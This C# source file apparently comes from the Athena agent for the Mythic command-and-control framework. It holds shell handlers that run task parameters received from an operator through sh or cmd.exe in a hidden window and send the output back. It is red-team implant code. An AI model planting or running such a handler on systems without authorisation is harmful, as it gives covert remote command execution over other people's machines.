using Athena.Models.Mythic.Tasks;
using System;
using System.Diagnostics;
using System.Threading.Tasks;
using PluginBase;
using System.Text;
using System.Collections.Concurrent;
using System.Collections.Generic;
using System.IO;
using Athena.Models.Athena.Commands;
using System.Linq;

namespace Athena.Commands
{
    public class ShellHandler
    {
        ConcurrentDictionary<string, ShellJob> commandTracking = new ConcurrentDictionary<string, ShellJob>();
        //private ConcurrentBag<ShellJob> commandTracking = new ConcurrentBag<ShellJob>();
        public ShellHandler()
        {

        }

        public async Task<bool> HasRunningJobs()
        {
            if(commandTracking.Count > 0)
            {
                return true;
            }
            return false;
        }

        public async Task<ResponseResult> ShellExec(MythicJob job)
        {
            string shell;
            if (OperatingSystem.IsMacOS() || OperatingSystem.IsLinux())
            {
                shell = Environment.GetEnvironmentVariable("SHELL");
                if (string.IsNullOrEmpty(shell))
                {
                    shell = "/bin/sh";
                }
                job.task.parameters = "-c " + job.task.parameters;
            }
            else if (OperatingSystem.IsWindows())
            {
                shell = Environment.GetEnvironmentVariable("ComSpec");
                if (string.IsNullOrEmpty(shell))
                {
                    shell = "cmd.exe";
                }
                job.task.parameters = "/C " + job.task.parameters;
            }
            else
            {
                return new ResponseResult()
                {
                    user_output = "Could not determine shell!",
                    task_id = job.task.id,
                    completed = "true",
                };
            }


            ShellJob sj = new ShellJob(job)
            {
                sb = new StringBuilder(),
                isRunning = true,
                process = new Process
                {
                    StartInfo = new ProcessStartInfo()
                    {
                        UseShellExecute = false,
                        CreateNoWindow = true,
                        WindowStyle = ProcessWindowStyle.Hidden,
                        FileName = shell,
                        Arguments = job.task.parameters,
                        RedirectStandardError = true,
                        RedirectStandardOutput = true
                    }
                }
            };
            try
            {
                sj.process.ErrorDataReceived += (sender, errorLine) => { if (errorLine.Data is not null) sj.sb.AppendLine(errorLine.Data); };
                sj.process.OutputDataReceived += (sender, outputLine) => { if (outputLine.Data is not null) sj.sb.AppendLine(outputLine.Data); };


                sj.process.Start();
                sj.process.BeginErrorReadLine();
                sj.process.BeginOutputReadLine();
                
                //Add to Tracking
                this.commandTracking.GetOrAdd(sj.task.id, sj);

                sj.process.WaitForExit();

                //Remove from tracking
                this.commandTracking.Remove(sj.task.id, out _);

                sj.isRunning = false;

                ResponseResult result = new ResponseResult()
                {
                    user_output = sj.sb.ToString(),
                    task_id = job.task.id,
                    completed = "true",
                };

                sj.sb.Clear();

                if (sj.process.ExitCode != 0)
                {
                    result.status = "error";
                    result.user_output += Environment.NewLine + "Process exited with code: " + sj.process.ExitCode;
                }

                return result;
            }
            catch (Exception e)
            {
                return new ResponseResult()
                {
                    //user_output = process.StandardOutput.ReadToEnd() + Environment.NewLine + process.StandardError.ReadToEnd() + Environment.NewLine + e.Message,
                    user_output = sj.sb.ToString() + Environment.NewLine + e.Message,
                    task_id = job.task.id,
                    completed = "true",
                    status = "error"
                };
            }
        }
    
        public async Task<List<ResponseResult>> GetOutput()
        {
            ConcurrentBag<ResponseResult> results = new ConcurrentBag<ResponseResult>();

            await Parallel.ForEachAsync(commandTracking, async (job, cancellationToken) =>
            {
                if (job.Value.sb.Length > 0)
                {
                    results.Add(new ResponseResult() {
                        user_output = job.Value.sb.ToString(),
                        task_id = job.Value.task.id,
                    });

                    job.Value.sb.Clear();
                }
            });

            return results.ToList();
        }
    }


    public class ShellHandler2
    {
        /// <summary>
        /// Execute a shell command
        /// </summary>
        /// <param name="job">The MythicJob containing the execution parameters</param>
        /// 

        public async static Task<ResponseResult> ShellExec (MythicJob job)
        {
            StringBuilder sb = new StringBuilder();
            Process process = new Process();

            string shell;

            if (OperatingSystem.IsMacOS() || OperatingSystem.IsLinux())
            {
                shell = Environment.GetEnvironmentVariable("SHELL");
                if (string.IsNullOrEmpty(shell))
                {
                    shell = "/bin/sh";
                }
                job.task.parameters = "-c " + job.task.parameters;
            }
            else if (OperatingSystem.IsWindows())
            {
                shell = Environment.GetEnvironmentVariable("ComSpec");
                if (string.IsNullOrEmpty(shell))
                {
                    shell = "cmd.exe";
                }
                job.task.parameters = "/C " + job.task.parameters;
            }
            else
            {
                return new ResponseResult()
                {
                    user_output = "Could not determine shell!",
                    task_id = job.task.id,
                    completed = "true",
                };
            }

            process.StartInfo = new ProcessStartInfo()
            {
                UseShellExecute = false,
                CreateNoWindow = true,
                WindowStyle = ProcessWindowStyle.Hidden,
                FileName = shell,
                Arguments = job.task.parameters,
                RedirectStandardError = true,
                RedirectStandardOutput = true
            };
            try
            {
                //This is how I handled streaming output, will have to revisit this
                //process.ErrorDataReceived += (sender, errorLine) => { if (errorLine.Data is not null) job.taskresult += errorLine.Data + Environment.NewLine;};
                //process.OutputDataReceived += (sender, outputLine) => { if (outputLine.Data is not null) job.taskresult += outputLine.Data + Environment.NewLine; job.hasoutput = true;};
                //May have to change this to check if the response has a response with it's task ID, if it does append to it, if it doesn't add it
                //Maybe change this similar to I'm now handling Assembly Execution

                process.ErrorDataReceived += (sender, errorLine) => { if (errorLine.Data is not null) sb.AppendLine(errorLine.Data);};
                process.OutputDataReceived += (sender, outputLine) => { if (outputLine.Data is not null) sb.AppendLine(outputLine.Data); };


                process.Start();
                process.BeginErrorReadLine();
                process.BeginOutputReadLine();

                process.WaitForExit();

                ResponseResult result = new ResponseResult()
                {
                    user_output = sb.ToString(),
                    task_id = job.task.id,
                    completed = "true",
                };

                if (process.ExitCode != 0)
                {
                    result.status = "error";
                    result.user_output += Environment.NewLine + "Process exited with code: " + process.ExitCode;
                }

                return result;
            }
            catch (Exception e)
            {
                return new ResponseResult()
                {
                    //user_output = process.StandardOutput.ReadToEnd() + Environment.NewLine + process.StandardError.ReadToEnd() + Environment.NewLine + e.Message,
                    user_output = sb.ToString() + Environment.NewLine + e.Message,
                    task_id = job.task.id,
                    completed = "true",
                    status = "error"
                };
            }
        }
    }
}
